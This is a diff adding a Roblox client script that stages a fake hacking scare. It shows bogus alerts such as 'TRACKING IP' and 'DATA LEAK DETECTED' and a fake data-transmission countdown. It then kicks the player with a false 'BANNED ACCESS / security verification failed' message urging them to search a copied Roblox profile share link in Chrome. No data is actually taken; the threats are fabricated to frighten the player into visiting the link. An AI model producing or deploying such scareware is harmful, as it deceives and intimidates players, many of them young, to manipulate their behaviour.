@@ -1,0 +1,210 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+
+----------------------------------------------------
+-- 🌑 DARK MODE
+----------------------------------------------------
+Lighting.Brightness = 0
+Lighting.Ambient = Color3.fromRGB(0,0,0)
+Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
+Lighting.ClockTime = 0
+Lighting.FogStart = 0
+Lighting.FogEnd = 35
+Lighting.FogColor = Color3.fromRGB(0,0,0)
+
+task.spawn(function()
+	while true do
+		Lighting.Brightness = 0.15
+		task.wait(0.12)
+		Lighting.Brightness = 0
+		task.wait(0.25)
+	end
+end)
+
+----------------------------------------------------
+-- 🧱 UI
+----------------------------------------------------
+local gui = Instance.new("ScreenGui")
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.6,0,0.5,0)
+frame.Position = UDim2.new(0.2,0,0.25,0)
+frame.BackgroundColor3 = Color3.fromRGB(18,18,18)
+frame.BorderSizePixel = 0
+frame.Parent = gui
+
+local log = Instance.new("TextLabel")
+log.Size = UDim2.new(1,0,1,0)
+log.BackgroundTransparency = 1
+log.TextColor3 = Color3.fromRGB(235,235,235)
+log.Font = Enum.Font.Code
+log.TextSize = 18
+log.TextXAlignment = Enum.TextXAlignment.Left
+log.TextYAlignment = Enum.TextYAlignment.Top
+log.Text = ""
+log.Parent = frame
+
+local function typeLine(text)
+	for i = 1, #text do
+		log.Text = log.Text .. text:sub(i,i)
+		task.wait(0.015)
+	end
+	log.Text = log.Text .. "\n"
+	task.wait(0.2)
+end
+
+local device = UserInputService.TouchEnabled and "MOBILE" or "PC"
+
+----------------------------------------------------
+-- 🚀 MAIN LOG
+----------------------------------------------------
+typeLine("SYSTEM / 시스템: 보안 검사 시작")
+typeLine("USER / 사용자: " .. player.Name)
+typeLine("DEVICE / 기기: " .. device)
+typeLine("ANALYZING SESSION...")
+typeLine("WARNING: TRACKING ACTIVE")
+
+----------------------------------------------------
+-- ⚠ SYSTEM ERROR LOOP
+----------------------------------------------------
+task.spawn(function()
+	local msgs = {
+		"FIREWALL BREACH",
+		"UNAUTHORIZED ACCESS",
+		"TRACKING IP",
+		"DEVICE IDENTIFIED",
+		"SYSTEM CORRUPTION",
+		"DATA LEAK DETECTED"
+	}
+
+	while true do
+		local m = msgs[math.random(1,#msgs)]
+
+		pcall(function()
+			StarterGui:SetCore("SendNotification", {
+				Title = "SYSTEM ERROR",
+				Text = m,
+				Duration = 0.2
+			})
+		end)
+
+		log.Text = log.Text .. "\n[" .. m .. "]"
+		task.wait(math.random(2,5)*0.1)
+	end
+end)
+
+----------------------------------------------------
+-- 💀 FINAL SEQUENCE
+----------------------------------------------------
+task.spawn(function()
+	task.wait(2)
+
+	------------------------------------------------
+	-- 🌑 FADE
+	------------------------------------------------
+	local black = Instance.new("ScreenGui")
+	black.Parent = player:WaitForChild("PlayerGui")
+
+	local fade = Instance.new("Frame")
+	fade.Size = UDim2.new(1,0,1,0)
+	fade.BackgroundColor3 = Color3.fromRGB(0,0,0)
+	fade.BackgroundTransparency = 1
+	fade.Parent = black
+
+	for i = 1, 20 do
+		fade.BackgroundTransparency = 1 - (i * 0.05)
+		task.wait(0.05)
+	end
+
+	fade.BackgroundTransparency = 0
+	task.wait(0.5)
+
+	------------------------------------------------
+	-- 🔗 REAL DRAG COPY LINK (FIXED)
+	------------------------------------------------
+	local linkFrame = Instance.new("Frame")
+	linkFrame.Size = UDim2.new(0.7,0,0.2,0)
+	linkFrame.Position = UDim2.new(0.15,0,0.4,0)
+	linkFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+	linkFrame.BorderSizePixel = 2
+	linkFrame.Parent = black
+
+	local title = Instance.new("TextLabel")
+	title.Size = UDim2.new(1,0,0.3,0)
+	title.BackgroundTransparency = 1
+	title.TextColor3 = Color3.fromRGB(255,255,255)
+	title.Font = Enum.Font.Code
+	title.TextSize = 18
+	title.Text = "SOURCE LINK"
+	title.Parent = linkFrame
+
+	local url = Instance.new("TextBox")
+	url.Size = UDim2.new(0.95,0,0.3,0)
+	url.Position = UDim2.new(0.025,0,0.3,0)
+	url.BackgroundTransparency = 1
+	url.TextColor3 = Color3.fromRGB(0,255,150)
+	url.Font = Enum.Font.Code
+	url.TextSize = 16
+	url.TextWrapped = true
+	url.TextXAlignment = Enum.TextXAlignment.Center
+	url.Text = "https://www.roblox.com/share?code=2ff3d7baa6e5d44e92fe6e0f81c4f340&type=Profile&source=ProfileShare&stamp=1777890447618"
+
+	-- 🔥 핵심: 진짜 드래그 복사 가능
+	url.ClearTextOnFocus = false
+	url.TextEditable = false
+	url.Selectable = true
+	url.Active = true
+
+	url.Parent = linkFrame
+
+	local guide = Instance.new("TextLabel")
+	guide.Size = UDim2.new(1,0,0.4,0)
+	guide.Position = UDim2.new(0,0,0.6,0)
+	guide.BackgroundTransparency = 1
+	guide.TextColor3 = Color3.fromRGB(255,255,255)
+	guide.Font = Enum.Font.Code
+	guide.TextSize = 14
+	guide.Text = "▶ Drag to select → CTRL + C to copy\n▶ Mobile: long press to copy"
+	guide.Parent = linkFrame
+
+	------------------------------------------------
+	-- 📡 전송
+	------------------------------------------------
+	task.wait(5)
+	linkFrame:Destroy()
+
+	local sendLabel = Instance.new("TextLabel")
+	sendLabel.Size = UDim2.new(1,0,1,0)
+	sendLabel.BackgroundTransparency = 1
+	sendLabel.TextColor3 = Color3.fromRGB(255,255,255)
+	sendLabel.Font = Enum.Font.Code
+	sendLabel.TextSize = 26
+	sendLabel.Parent = black
+
+	for i = 1, 15 do
+		sendLabel.Text = "전송중" .. string.rep(".", i)
+		task.wait(0.2)
+	end
+
+	sendLabel.Text = "전송완료."
+	task.wait(1)
+
+	sendLabel.Text = "SYSTEM DISCONNECTING..."
+	task.wait(0.8)
+
+	black:Destroy()
+	gui:Destroy()
+
+	task.wait(0.3)
+
+	player:Kick(
+		"BANNED ACCESS / 차단됨\n" ..
+		"Security verification failed / 보안 인증 실패\n\n" ..
+		"Please search the copied link in Google Chrome / 크롬(구글)에서 복사한 링크를 검색하십시오"
+	)
+end)
